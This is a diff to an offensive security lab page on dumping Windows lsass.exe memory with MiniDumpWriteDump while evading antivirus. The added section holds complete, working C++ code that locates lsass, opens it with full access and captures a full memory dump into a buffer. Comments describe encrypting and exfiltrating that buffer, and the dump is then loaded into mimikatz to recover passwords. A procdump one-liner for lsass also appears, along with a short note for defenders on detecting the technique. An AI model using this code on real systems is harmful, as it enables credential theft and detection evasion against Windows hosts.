@@ -2,7 +2,7 @@
 description: 'Evasion, Credential Dumping'
 ---
 
-# Dumping LSASS without Mimikatz with MiniDumpWriteDump == Reduced Chances of Getting Flagged by AVs
+# Dumping LSASS without Mimikatz with MiniDumpWriteDump == Reducing Chances of Getting Flagged
 
 This lab explores how one could write a simple `lsass` process dumper for extracting the passwords it contains later on with mimikatz. **Possibly** without getting detected by some AV vendors - if you have a way of testing this against some known EDR solutions, I would be interested to hear about your findings.
 
@@ -10,9 +10,11 @@ This lab explores how one could write a simple `lsass` process dumper for extrac
 The below code uses a number of known Windows API calls that could still be flagged by some antivirus agent or EDR solution.
 {% endhint %}
 
-## MiniDumpWriteDump Code
+## MiniDumpWriteDump to Disk
 
-Below is a simple code that leverages `MiniDumpWriteDump` API call to dump lsass.exe process memory. Let's go ahead and compile this C++ code:
+It's possible to use `MiniDumpWriteDump` API call to dump lsass.exe process memory.
+
+### Code
 
 {% code title="dumper.cpp" %}
 ```cpp
@@ -59,7 +61,12 @@ Do not forget to add `dbghelp.lib` as a dependency in the Linker &gt; Input sett
 
 ![](../../.gitbook/assets/screenshot-from-2019-03-23-17-01-44.png)
 
-## Execution Demo
+{% hint style="info" %}
+Or simply include at the top of the source code:  
+`#pragma comment (lib, "Dbghelp.lib")`
+{% endhint %}
+
+### Demo
 
 1. Execute CreateMiniDump.exe \(compiled file above\) or compile your own binary
 2. Lsass.dmp gets dumped to the working directory
@@ -78,7 +85,7 @@ sekurlsa::logonpasswords
 
 ![](../../.gitbook/assets/peek-2019-03-23-22-16.gif)
 
-## Why it's worth it?
+### Why it's worth it?
 
 See how Windows Defender on Windows 10 is flagging up mimikatz immediately... but allows running CreateMiniDump.exe? Good for us - we get lsass.exe dumped to `lsass.dmp`:
 
@@ -90,11 +97,141 @@ See how Windows Defender on Windows 10 is flagging up mimikatz immediately... bu
 
 Of ourse, there is procdump that does the same thing and it does not get flagged by Windows defender, but it is always good to know there are alternatives you could turn to if you need to for whatever reason. 
 
-## Observations
+### Observations
 
 As mentioned earlier, the code above uses a native windows API call `MiniDumpWriteDump` to make a memory dump of a given process. If you are on the blue team and trying to write detections for these activities, you may consider looking for processes loading in `dbghelp.dll` module and calling `MiniDumpWriteDump` function:
 
 ![](../../.gitbook/assets/screenshot-from-2019-03-23-17-08-29.png)
+
+## MiniDumpWriteDump to Memory
+
+By default, `MiniDumpWriteDump` will dump lsass.exe process memory to disk, however it's possible to use `MINIDUMP_CALLBACK_INFORMATION` callbacks to create a process MiniDump in memory, where you could encrypt it before dropping to disk or exfiltrate it over the network.
+
+### Code
+
+The below code shows how we can create a MiniDump and store its buffer in a memory location, where we can process the buffer as required.
+
+```cpp
+#include <windows.h>
+#include <DbgHelp.h>
+#include <iostream>
+#include <TlHelp32.h>
+#include <processsnapshot.h>
+#pragma comment (lib, "Dbghelp.lib")
+
+using namespace std;
+
+// Buffer for saving the minidump
+LPVOID dumpBuffer = HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, 1024 * 1024 * 75);
+DWORD bytesRead = 0;
+
+BOOL CALLBACK minidumpCallback(
+	__in     PVOID callbackParam,
+	__in     const PMINIDUMP_CALLBACK_INPUT callbackInput,
+	__inout  PMINIDUMP_CALLBACK_OUTPUT callbackOutput
+)
+{
+	LPVOID destination = 0, source = 0;
+	DWORD bufferSize = 0;
+
+	switch (callbackInput->CallbackType)
+	{
+		case IoStartCallback:
+			callbackOutput->Status = S_FALSE;
+			break;
+
+		// Gets called for each lsass process memory read operation
+		case IoWriteAllCallback:
+			callbackOutput->Status = S_OK;
+			
+			// A chunk of minidump data that's been jus read from lsass. 
+			// This is the data that would eventually end up in the .dmp file on the disk, but we now have access to it in memory, so we can do whatever we want with it.
+			// We will simply save it to dumpBuffer.
+			source = callbackInput->Io.Buffer;
+			
+			// Calculate location of where we want to store this part of the dump.
+			// Destination is start of our dumpBuffer + the offset of the minidump data
+			destination = (LPVOID)((DWORD_PTR)dumpBuffer + (DWORD_PTR)callbackInput->Io.Offset);
+			
+			// Size of the chunk of minidump that's just been read.
+			bufferSize = callbackInput->Io.BufferBytes;
+			bytesRead += bufferSize;
+			
+			RtlCopyMemory(destination, source, bufferSize);
+			
+			printf("[+] Minidump offset: 0x%x; length: 0x%x\n", callbackInput->Io.Offset, bufferSize);
+			break;
+
+		case IoFinishCallback:
+			callbackOutput->Status = S_OK;
+			break;
+
+		default:
+			return true;
+	}
+	return TRUE;
+}
+
+int main() {
+	DWORD lsassPID = 0;
+	DWORD bytesWritten = 0;
+	HANDLE lsassHandle = NULL;
+	HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
+	LPCWSTR processName = L"";
+	PROCESSENTRY32 processEntry = {};
+	processEntry.dwSize = sizeof(PROCESSENTRY32);
+
+	// Get lsass PID
+	if (Process32First(snapshot, &processEntry)) {
+		while (_wcsicmp(processName, L"lsass.exe") != 0) {
+			Process32Next(snapshot, &processEntry);
+			processName = processEntry.szExeFile;
+			lsassPID = processEntry.th32ProcessID;
+		}
+		printf("[+] lsass PID=0x%x\n",lsassPID);
+	}
+
+	lsassHandle = OpenProcess(PROCESS_ALL_ACCESS, 0, lsassPID);
+	
+	// Set up minidump callback
+	MINIDUMP_CALLBACK_INFORMATION callbackInfo;
+	ZeroMemory(&callbackInfo, sizeof(MINIDUMP_CALLBACK_INFORMATION));
+	callbackInfo.CallbackRoutine = &minidumpCallback;
+	callbackInfo.CallbackParam = NULL;
+
+	// Dump lsass
+	BOOL isDumped = MiniDumpWriteDump(lsassHandle, lsassPID, NULL, MiniDumpWithFullMemory, NULL, NULL, &callbackInfo);
+
+	if (isDumped) 
+	{
+		// At this point, we have the lsass dump in memory at location dumpBuffer - we can do whatever we want with that buffer, i.e encrypt & exfiltrate
+		printf("\n[+] lsass dumped to memory 0x%p\n", dumpBuffer);
+		HANDLE outFile = CreateFile(L"c:\\temp\\lsass.dmp", GENERIC_ALL, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
+	
+		// For testing purposes, let's write lsass dump to disk from our own dumpBuffer and check if mimikatz can work it
+		if (WriteFile(outFile, dumpBuffer, bytesRead, &bytesWritten, NULL))
+		{
+			printf("\n[+] lsass dumped from 0x%p to c:\\temp\\lsass.dmp\n", dumpBuffer, bytesWritten);
+		}
+	}
+	
+	return 0;
+}
+```
+
+Thanks [Niall Newman](https://twitter.com/NiallNSec) for pointing me to [SafetyDump](https://github.com/m0rv4i/SafetyDump/blob/master/SafetyDump/Program.cs) by [@m0rv4i](https://twitter.com/m0rv4i), who implemented `MiniDumpWriteDump` with callbacks in C\#.
+
+### Demo
+
+On the left, `0x00000135B8291040` \(`dumpBuffer`\) gets populated with MiniDump data after the `MiniDumpWriteDump` API is called.
+
+On the right, we're executing the same code and it says that the MiniDump was written to our buffer at `0x000001AEA0BC4040`. For testing purposes, bytes from the same buffer `0x000001AEA0BC4040` were also written to `c:\temp\lsass.dmp` using `WriteFile`, so that we could load the lsass dump to mimikatz \(bottom right\) and ensure it's not corrupted and credentials can be retrieved:
+
+![MiniDumpWriteDump dumping lsass process to a memory location](../../.gitbook/assets/minidumpwritedump-dump-to-memory.gif)
+
+{% hint style="info" %}
+If you ever try using `MiniDumpWriteDump` to dump process memory to memory using named pipes, you will notice that the minidump file "kind of" gets created, but mimikatz is not able to read it. That's because the minidump file buffer is actually read/written non-sequentially \(you can see this from the screenshot in the top right corner - note the differing offsets of the write operations of the minidump data\), so when you are reading the minidump data using named pipes, you simply are writting the data in incorrect order, which effectively produces a corrupted minidump file.
+{% endhint %}
 
 ## PssCaptureSnapshot
 
@@ -197,4 +334,6 @@ procdump -accepteula -r -ma lsass.exe lsass.dmp
 {% embed url="https://docs.microsoft.com/en-us/previous-versions/windows/desktop/proc\_snap/export-a-process-snapshot-to-a-file" %}
 
 {% embed url="https://docs.microsoft.com/en-us/windows/win32/api/processsnapshot/nf-processsnapshot-psscapturesnapshot" %}
+
+{% embed url="https://github.com/m0rv4i/SafetyDump/blob/master/SafetyDump/Program.cs" %}
 
